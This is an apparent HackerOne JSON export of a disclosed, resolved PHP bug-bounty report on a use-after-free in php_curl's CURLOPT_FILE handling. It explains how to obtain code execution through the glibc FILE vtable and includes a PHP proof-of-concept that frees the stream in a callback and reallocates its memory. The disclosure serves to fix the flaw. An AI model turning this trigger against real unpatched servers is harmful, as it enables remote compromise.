{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [
        "eveeez", 
        "spetr0x"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 73246, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2015-04-14T00:00:00.000Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Use-after-free in php_curl related to CURLOPT_FILE/_INFILE/_WRITEHEADER", 
    "is_member_of_team?": null, 
    "vote_count": 2, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$500", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2015-06-30T11:41:33.734Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-30T11:41:33.734Z", 
            "actor": {
                "url": "/ibb-php", 
                "profile": {
                    "name": "PHP (IBB)"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
                }
            }, 
            "team_handle": "ibb-php", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "mongo", 
                "url": "/mongo"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 496256, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "mongo", 
                "url": "/mongo"
            }, 
            "created_at": "2015-06-30T11:41:33.734Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-15T13:29:46.180Z", 
            "actor": {
                "url": "/ibb-php", 
                "profile": {
                    "name": "PHP (IBB)"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
                }
            }, 
            "team_handle": "ibb-php", 
            "message": null, 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 1196222, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "mongo", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/mongo", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/019/482/69ae8ec507576ad083c20cd5559a4f3bbd2e0255_small.png?1463395488"
        }, 
        "is_me?": false
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2015-04-14T00:00:00.000Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/73246", 
    "created_at": "2015-03-27T00:00:00.000Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p><a title=\"https://bugs.php.net/bug.php?id=69316\" href=\"/redirect?signature=b37a962825eccee154f9ff27b2683533eae41017&amp;url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D69316\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://bugs.php.net/bug.php?id=69316</span><i class=\"icon-external-link\"></i></a></p>\n\n<h2 id=\"description\">Description:</h2>\n\n<p>All the relevant code mentioned below is in ext/curl/interface.c.<br>\nAs far as I can see, every PHP version after (at least) 5.0 is affected; possibly older versions too.</p>\n\n<p>When using CURLOPT_WRITEHEADER, CURLOPT_INFILE or CURLOPT_FILE, in _php_curl_setopt, the provided stream is cast to a stdio FILE*:</p>\n<pre class=\"highlight plaintext\"><code>if (FAILURE == php_stream_cast((php_stream *) what, PHP_STREAM_AS_STDIO, (void *) &amp;fp, REPORT_ERRORS)) {\n        return FAILURE;\n}\n</code></pre>\n<p>This FILE* is then stored in the php_curl structure &quot;ch&quot;, at the following locations, depending on which CURLOPT_ was used:</p>\n\n<ul>\n<li>ch-&gt;handlers-&gt;write-&gt;fp = fp;</li>\n<li>ch-&gt;handlers-&gt;write_header-&gt;fp = fp;</li>\n<li>ch-&gt;handlers-&gt;read-&gt;fp = fp;</li>\n</ul>\n\n<p>Upon curl_exec(), _php_curl_verify_handlers() is called, which verifies if the user-set stream(s) are still open, and resets -&gt;fp to 0 if they are not.</p>\n\n<p>However, there are a number of curl callbacks we can use to close the stream after _php_curl_verify_handlers() has been called, resulting in the FILE* being free()&#39;d. By allocating memory that ends up a the same address where the FILE structure was, its possible to achieve arbitrary code execution.</p>\n\n<p>The following functions use *-&gt;fp without checking if the corresponding streams are still open (and thus if *-&gt;fp still points to a valid FILE structure or not):</p>\n\n<ul>\n<li>static size_t curl_write(char *data, size_t size, size_t nmemb, void *ctx)</li>\n<li>static size_t curl_read(char *data, size_t size, size_t nmemb, void *ctx)</li>\n<li>static size_t curl_write_header(char *data, size_t size, size_t nmemb, void *ctx)</li>\n<li>curl_exec (after curl processing is finished, there are 2 fflush() calls)</li>\n</ul>\n\n<p>On Linux, with PHP linked against GLIBC, arbitrary code execution is trivial, since FILE structures conveniently have a &quot;vtable&quot; full of function pointers which we now control.<br>\nOn Windows, exploitability depends on the version of the C runtime being used. Recent MS C runtimes keep a cache of FILE structures (they aren&#39;t free()&#39;d upon fclose()), which complicates things.</p>\n\n<p>Please see the test script attached, tested against:</p>\n\n<ul>\n<li>64-bit PHP 5.5.9-1ubuntu4.7 (cli) (built: Mar 16 2015 20:47:39) </li>\n<li>32-bit PHP 5.5.9-1ubuntu4.7 (cli) (built: Mar 16 2015 20:48:03) </li>\n<li>32/64-bit PHP 5.6.7 (cli) (built: Mar 27 2015 07:04:21) (DEBUG)   - custom build with ./configure --with-curl --enable-debug</li>\n</ul>\n\n<h2 id=\"test-script\">Test script:</h2>\n<pre class=\"highlight plaintext\"><code>&lt;?php\nfunction hdr_callback($ch, $data) {\n    global $f_file;\n\n    if ($f_file) {\n            // close the stream, causing the FILE structure to be free()&#39;d\n        fclose($f_file); $f_file = 0;\n\n        // cause an allocation of approx the same size as a FILE structure, size varies a bit depending on platform/libc\n        $FILE_size = (PHP_INT_SIZE == 4 ? 0x160 : 0x238);\n        curl_setopt($ch, CURLOPT_COOKIE, str_repeat(&quot;a&quot;, $FILE_size - 1));\n    }\n\n    return strlen($data);\n}\n\n$ch = curl_init(&#39;http://www.php.net/&#39;);\n$f_file = fopen(&quot;body&quot;, &quot;w&quot;) or die(&quot;failed to open file\\n&quot;);\ncurl_setopt($ch, CURLOPT_BUFFERSIZE, 10);\ncurl_setopt($ch, CURLOPT_HEADERFUNCTION, &quot;hdr_callback&quot;);\ncurl_setopt($ch, CURLOPT_FILE, $f_file);\ncurl_exec($ch);\n?&gt;\n</code></pre>", 
    "vulnerability_information": "https://bugs.php.net/bug.php?id=69316\n\nDescription:\n------------\nAll the relevant code mentioned below is in ext/curl/interface.c.\nAs far as I can see, every PHP version after (at least) 5.0 is affected; possibly older versions too.\n\nWhen using CURLOPT_WRITEHEADER, CURLOPT_INFILE or CURLOPT_FILE, in _php_curl_setopt, the provided stream is cast to a stdio FILE*:\n\n```\nif (FAILURE == php_stream_cast((php_stream *) what, PHP_STREAM_AS_STDIO, (void *) &fp, REPORT_ERRORS)) {\n        return FAILURE;\n}\n```\n\nThis FILE* is then stored in the php_curl structure \"ch\", at the following locations, depending on which CURLOPT_ was used:\n- ch->handlers->write->fp = fp;\n- ch->handlers->write_header->fp = fp;\n- ch->handlers->read->fp = fp;\n\nUpon curl_exec(), _php_curl_verify_handlers() is called, which verifies if the user-set stream(s) are still open, and resets ->fp to 0 if they are not.\n\nHowever, there are a number of curl callbacks we can use to close the stream after _php_curl_verify_handlers() has been called, resulting in the FILE* being free()'d. By allocating memory that ends up a the same address where the FILE structure was, its possible to achieve arbitrary code execution.\n\nThe following functions use *->fp without checking if the corresponding streams are still open (and thus if *->fp still points to a valid FILE structure or not):\n- static size_t curl_write(char *data, size_t size, size_t nmemb, void *ctx)\n- static size_t curl_read(char *data, size_t size, size_t nmemb, void *ctx)\n- static size_t curl_write_header(char *data, size_t size, size_t nmemb, void *ctx)\n- curl_exec (after curl processing is finished, there are 2 fflush() calls)\n\nOn Linux, with PHP linked against GLIBC, arbitrary code execution is trivial, since FILE structures conveniently have a \"vtable\" full of function pointers which we now control.\nOn Windows, exploitability depends on the version of the C runtime being used. Recent MS C runtimes keep a cache of FILE structures (they aren't free()'d upon fclose()), which complicates things.\n\nPlease see the test script attached, tested against:\n- 64-bit PHP 5.5.9-1ubuntu4.7 (cli) (built: Mar 16 2015 20:47:39) \n- 32-bit PHP 5.5.9-1ubuntu4.7 (cli) (built: Mar 16 2015 20:48:03) \n- 32/64-bit PHP 5.6.7 (cli) (built: Mar 27 2015 07:04:21) (DEBUG)   - custom build with ./configure --with-curl --enable-debug\n\nTest script:\n---------------\n```\n<?php\nfunction hdr_callback($ch, $data) {\n    global $f_file;\n\n    if ($f_file) {\n            // close the stream, causing the FILE structure to be free()'d\n        fclose($f_file); $f_file = 0;\n\n        // cause an allocation of approx the same size as a FILE structure, size varies a bit depending on platform/libc\n        $FILE_size = (PHP_INT_SIZE == 4 ? 0x160 : 0x238);\n        curl_setopt($ch, CURLOPT_COOKIE, str_repeat(\"a\", $FILE_size - 1));\n    }\n\n    return strlen($data);\n}\n\n$ch = curl_init('http://www.php.net/');\n$f_file = fopen(\"body\", \"w\") or die(\"failed to open file\\n\");\ncurl_setopt($ch, CURLOPT_BUFFERSIZE, 10);\ncurl_setopt($ch, CURLOPT_HEADERFUNCTION, \"hdr_callback\");\ncurl_setopt($ch, CURLOPT_FILE, $f_file);\ncurl_exec($ch);\n?>\n```\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://www.php.net", 
            "about": "", 
            "twitter_handle": "", 
            "name": "PHP (IBB)"
        }, 
        "handle": "ibb-php", 
        "url": "https://hackerone.com/ibb-php", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/029/0a20311cece1ff1938eac3f9b09a6af056bc9e90_small.png?1385119730", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 29, 
        "default_currency": "usd"
    }, 
    "is_published": false
}